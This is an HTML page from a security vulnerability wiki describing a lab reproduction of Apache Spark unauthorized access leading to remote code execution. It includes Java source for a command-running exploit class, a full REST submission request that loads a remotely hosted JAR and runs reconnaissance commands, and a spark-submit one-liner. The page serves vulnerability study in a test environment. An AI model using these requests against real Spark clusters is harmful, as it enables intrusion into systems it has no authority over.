@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/spark/unacc/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Spark Unauthorized Access Leads to Remote Code Execution - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Spark Unauthorized Access Leads to Remote Code Execution", url: "#_top", children: [
+              {title: "Vulnerability Environment", url: "#vulnerability-environment" },
+              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Spark 未授权访问导致远程代码执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../solr/Remote-Streaming-Fileread/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../solr/Remote-Streaming-Fileread/README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Solr RemoteStreaming 任意文件读取和SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-spark-unauthorized-access-leads-to-remote-code-execution">Apache Spark Unauthorized Access Leads to Remote Code Execution<a class="headerlink" href="#apache-spark-unauthorized-access-leads-to-remote-code-execution" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Apache Spark is a cluster computing system that allows users to submit applications to the management node for cluster execution. If the management node has not enabled ACL (Access Control List), it becomes possible to execute arbitrary code in the cluster.</p>
+<p>Reference links:</p>
+<ul>
+<li><a href="https://weibo.com/ttarticle/p/show?id=2309404187794313453016">https://weibo.com/ttarticle/p/show?id=2309404187794313453016</a></li>
+<li><a href="https://xz.aliyun.com/t/2490">https://xz.aliyun.com/t/2490</a></li>
+</ul>
+<h2 id="vulnerability-environment">Vulnerability Environment<a class="headerlink" href="#vulnerability-environment" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start an Apache Spark cluster in standalone mode, which includes one master and one slave:</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>After the environment starts, visit <code>http://your-ip:8080</code> to access the master's management page, and <code>http://your-ip:8081</code> to access the slave's management page.</p>
+<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
+<p>The essence of this vulnerability is that unauthorized users can submit an application to the management node, where this application is actually malicious code.</p>
+<p>There are two ways to submit applications:</p>
+<ol>
+<li>Using REST API</li>
+<li>Using submissions gateway (integrated in port 7077)</li>
+</ol>
+<p>The application can be written in Java or Python. Here's a simple example class (from reference link 1):</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exploit</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cmds</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+<span class="w">      </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">executeCommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="na">trim</span><span class="p">()));</span>
+<span class="w">      </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;==============================================&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// https://www.mkyong.com/java/how-to-execute-shell-command-from-java/</span>
+<span class="w">  </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">executeCommand</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">command</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+<span class="w">      </span><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span>
+<span class="w">      </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>
+
+<span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span>
+<span class="w">      </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">output</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">line</span><span class="p">).</span><span class="na">append</span><span class="p">(</span><span class="s">&quot;\n&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">output</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Compile it into a JAR file and host it on any HTTP or FTP server, for example: <code>https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</code>.</p>
+<h3 id="submitting-application-via-rest-api">Submitting Application via REST API<a class="headerlink" href="#submitting-application-via-rest-api" title="Permanent link">&para;</a></h3>
+<p>In standalone mode, the master starts an HTTP server on port 6066. We can submit a REST-formatted API request to this port:</p>
+<div class="highlight"><pre><span></span><code>POST /v1/submissions/create HTTP/1.1
+Host: your-ip:6066
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Content-Type: application/json
+Connection: close
+Content-Length: 680
+
+{
+  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,
+  &quot;clientSparkVersion&quot;: &quot;2.3.1&quot;,
+  &quot;appArgs&quot;: [
+    &quot;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;
+  ],
+  &quot;appResource&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,
+  &quot;environmentVariables&quot;: {
+    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;
+  },
+  &quot;mainClass&quot;: &quot;Exploit&quot;,
+  &quot;sparkProperties&quot;: {
+    &quot;spark.jars&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,
+    &quot;spark.driver.supervise&quot;: &quot;false&quot;,
+    &quot;spark.app.name&quot;: &quot;Exploit&quot;,
+    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,
+    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,
+    &quot;spark.master&quot;: &quot;spark://your-ip:6066&quot;
+  }
+}
+</code></pre></div>
+<p>Here, <code>spark.jars</code> is the compiled application, mainClass is the class to run, and appArgs are the parameters passed to the application.</p>
+<p><img alt="" src="1.png" /></p>
+<p>The response will contain a submissionId. You can then view the execution results by visiting <code>http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code>:</p>
+<p><img alt="" src="2.png" /></p>
+<p>Note: While the application is submitted to the master, the results are viewed in the slave that actually executes the application (default port 8081). In real-world scenarios, there might be multiple slaves.</p>
+<h3 id="using-the-submissions-gateway">Using the Submissions Gateway<a class="headerlink" href="#using-the-submissions-gateway" title="Permanent link">&para;</a></h3>
+<p>If port 6066 is inaccessible or has access controls, we can use the master's main port 7077 to submit applications.</p>
+<p>This can be done using Apache Spark's built-in script <code>bin/spark-submit</code>:</p>
+<div class="highlight"><pre><span></span><code>bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
+</code></pre></div>
+<p>If the master parameter you specify is a REST server, this script will first try to submit the application using the REST API; if it's not a REST server, it will fall back to using the submission gateway.</p>
+<p>The results can be viewed in the same way as described above.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Spark 未授权访问导致远程代码执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../solr/Remote-Streaming-Fileread/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../solr/Remote-Streaming-Fileread/README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Solr RemoteStreaming 任意文件读取和SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
